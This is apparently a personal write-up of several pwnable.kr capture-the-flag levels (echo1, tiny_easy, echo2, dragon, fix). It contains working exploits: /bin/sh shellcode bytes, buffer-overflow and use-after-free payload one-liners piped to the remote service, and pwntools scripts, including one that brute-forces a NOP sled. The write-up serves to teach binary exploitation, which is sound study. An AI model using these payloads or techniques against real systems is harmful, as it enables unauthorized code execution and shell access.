
 # LEVEL - echo1
 
 in tis level we get an executebel file we run it true ida and we get sit code:
 ```
 int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // rax
  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF
  int v6[4]; // [rsp+10h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ");
  __isoc99_scanf("%24s", v6);
  v3 = o;
  *(_QWORD *)o = v6[0];
  v3[1] = v6[1];
  v3[2] = v6[2];
  id = v6[0];
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  for ( i = 0; i != 'y'; i = getchar() )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ");
        __isoc99_scanf("%d", &i);
        getchar();
        if ( i > 3 )
          break;
        ((void (*)(void))func[i - 1])();
      }
      if ( i == 4 )
        break;
      puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)");
  }
  puts("bye");
  return 0;
}
```
so if we go to the function echo1:
```
__int64 echo1()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(s, 128LL);
  puts(s);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```
get_input is just f_gets so we see that we can buffer overflow here becuse we can write 128 cherecters into a string of size 32 
so we think a bout changing the ret pointer so we look at the addres of s and the ret pointer and we get that the string s is 
40 bytes away of the ret pointer so we can overflow him so now we checksec the file (checksec --file=echo1) we see that NX is off 
so we can execute code from the stack know we will gwt our attention on the id verbel in the main function we see that 
```
id = v6[0]
```
v6 is a array of int so every slot in the array worth 4 bytes so we put in id 4 chars becuse one char is worth 1 byte becuse the PIE is also off we now that the global verebels dont change adresses so we can write ashellcode to the id and then with the buffer overflow return to id and execuse the id because we have only 4 chars we cant write bin/sh shell code so what we will do is use the sp register we know that
the sp register at the buffer overflow will hold the ret pointer with is the id addres and then after the ret of the function will incress by 8 bytes so what we can do is to put a shell code of jmp RSP in id and we will jump to the shell code.
is get after the firest 8 byets after the bufeer overflow we can in sert a bin/sh shell code and then we will get the flag
the adress of id is 0x6020a0 and the shell code is \x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05
so we will execute:
(python2 -c "print('\xff\xe4\x00\x00\n' +'1\n' + 'a'*40 +'\xa0\x20\x60\x00\x00\x00\x00\x00\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05\n')"; cat) | nc pwnable.kr 9010

eli :)



 # LEVEL - tiny_easy
 when we debug the file we can run it becuse the file is too small so we use start i in gdb and we get the asm of he program 
```
0x8048054    pop    eax
0x8048055    pop    edx
0x8048056    mov    edx, dword ptr [edx]
0x8048058    call   edx
```

we know that in the _start the firest verbels that get saved are argc argv and env that we pass to the program so we get that the call edx will call the argv[0] so we use pwntools python functions 
the functuon process let us run the program with argv and env that we want so we know we can write to the stack with the virubels of argv and we all argv[0] so we will insert as much as we can shell code to the stack and pick some pocebule adress in the stack and try alot of times until we fall on a place with a shell code of bin/sh  to have more chance to fall on the start of the shellcode we use the nop instaraction to make the code skip until the shell code 
this is the code i made:
```
from pwn import *

shellcode = '\x6A\x68\x68\x2F\x2F\x2F\x73\x68\x2F\x62\x69\x6E\x89\xE3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xC9\x51\x6A\x04\x59\x01\xE1\x51\x89\xE1\x31\xD2\x6A\x0B\x58\xCD\x80'

envir = {'a':'1'}
for i in range(1,100):
    envir[str(i)] = '\x90'*12000+shellcode


while(True):

    r = process(argv=['\x11\x11\x88\xff'],executable = '/home/tiny_easy/./tiny_easy',env = envir)
    r.sendline("id")
    try:
        r.recvline()
    except EOFError:
        r.wait()
        continue
    r.interactive()
    break

```

 # LEVEL - echo2
 the code here is the same as echo1 one nut this timr we have the 2 functions
 echo2 - 
```
__int64 echo2()
{
  char format[32]; // [rsp+0h] [rbp-20h] BYREF

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(format, 32);
  printf(format);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

and echo3
```
__int64 echo3()
{
  char *s; // [rsp+8h] [rbp-8h]

  (*((void (__fastcall **)(void *))o + 3))(o);
  s = (char *)malloc(0x20uLL);
  get_input(s, 32);
  puts(s);
  free(s);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```
in this chalenge we can see that if we put 4 in the manue we will free the o verebel and then we can get beck to the menue with pressing n so now we freed the o vereble we can see we can alocate in echo3 the string verebel and he will point to the same place as o pointed to so we can change the functions o points to so to change the adress of the function greetings in the virebel o we need to wirte 24 cherecters and the new addres we want to put there but what is the adress we want to put there the adress of the virubel v6 where we store our name becuse there is inufe place to put bin/sh shellcode there so the last part is to figure out what is the adress of v6 is so with function echo2 we can get a leack of a stack adress with %p so in the 10th %p we gwt a stack adress so we check in gdb what is the distece bettwen the 2 adress and then we know how much to subtruct from the leacked adress when we will exploit the runing prugarm

here is the code in python that i used:
```
from pwn import *

shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p = remote('pwnable.kr',9011) #conecting to nc pwnable.ke port 9011

p.recv()
p.sendline(shellcode)
print(p.recv())
print(p.recv())
p.sendline(b"2")
print(p.recv())
p.sendline(b'%10$p')

first_hex = p.recvline().decode()# the leaked adress
print("1- "+first_hex)
an_integer = int(first_hex, 16)
an_integer -= 32 #the distance between the functions is 32
print(p.recvuntil(b'> '))
p.sendline(b"4")
print(p.recv())
p.sendline(b"n") # we free o and return to the menue
print(p.recvuntil(b'> '))
p.sendline(b"3")
print(p.recv())
p.sendline((24*'a').encode(encoding='utf-8')+p64(an_integer))#we change the adress of greetings that was stores in the o vereble
print("the uaf -")
#print((24*'a').encode(encoding='utf-8')+p64(an_integer))
print(p.recvuntil(b'> '))
p.sendline("2")
p.interactive() #get the bin/sh
```

 # LEVEL - dragon

in the program we get we can fight 2 dragons one dragon is Mama Dragon and the seconde one is Baby Dragon and we can play 2 carecters Priest or a Knight we cna see that the health of the dragons is stored one byte from the Regeneration of the dragon so the health stored at a char so if we will get the value of the healt to 128 we will make the value that is stored in the char a negative value so the char will over flow to the Regeneration and will make the dragon lose all of its health and we will win after that we can see that in the function where we are fightinh thr dragon after we win we free the pointer that stored the dregon values 
and if we look at the if we get to when we win 

```


v4 = malloc(0x10u);
/*
in the start of the function we alocate the memore for the pointer that stores the dragon valuse
*/

if ( v2 )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v5 = malloc(0x10u);
    __isoc99_scanf("%16s", v5);
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v4)(v4);
  }
```
so becuse we freed v4 before when we alocate v5 v5 will point to the adress v4 pointed to so what we enter in scanf to v5 will be write over what was written in v4 so in the end when we jump to a funcion v4 contaiend we will jump to what we write in the scanf to v5 so becuse in the secretlevel we have system(bin/sh) comment we will jump there 
this is the string i used to get the flag 
```
(python2 -c "print('2\n2\n1\n3\n3\n2\n3\n3\n2\n3\n3\n2\n3\n3\n2\n'+'\xbf\x8d\x04\x08\n')";cat)
```
 
 # LEVEL - fix
so in this level we get a shell code copyed from shell storm the shell code of bin/sh doesnt work in this program becouse when we push verebles to the stack at some point we push on the shellcode that on the stack too and we overide the stack with rubish so what we will need to do is to change the posishion of sh so the easyest soloshion is too pop esp insted of pushing ax in line 6 of the asm code so if we replace index 15 of the shell code with 5c hex 92 dec wich stand for pop esp and then we will change the sp adress and we could continue executing the shell code but becouse there is a stack limit we will need before executing the prugram write ulimit -s unlimited in the comend prompt to desabel stack limitation.

